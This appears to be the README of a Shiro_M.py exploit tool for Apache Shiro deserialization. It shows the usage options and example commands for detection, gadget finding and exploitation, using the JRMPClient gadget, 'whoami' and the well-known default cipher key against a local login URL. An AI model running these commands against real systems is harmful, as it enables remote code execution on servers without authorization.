# 0、Usage

`usage: Shiro_M.py [-h] -u URL [-t TYPE] [-g GADGET] [-c COMMAND] [-k KEY]

-OPTIONS-:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target url.
  -t TYPE, --type TYPE  Check or Exploit. Check:1, Find gadget:2, Exploit:3
  -g GADGET, --gadget GADGET
                        gadget
  -c COMMAND, --command COMMAND
                        gadget command
  -k KEY, --key KEY     CipherKey`

# 1、检测

​    python Shiro_M.py -u http://127.0.0.1:8080/login

# 2、Found gadget

​    python Shiro_M.py -u http://127.0.0.1:8080/login -t 2 -c "whoami" -k "kPH+bIxk5D2deZiIxcaaaA=="

# 3、Exp

​    python Shiro_M.py -u http://127.0.0.1:8080/login -t 3 -g "JRMPClient" -c "whoami" -k "kPH+bIxk5D2deZiIxcaaaA=="

# 注：

ysoserial比较大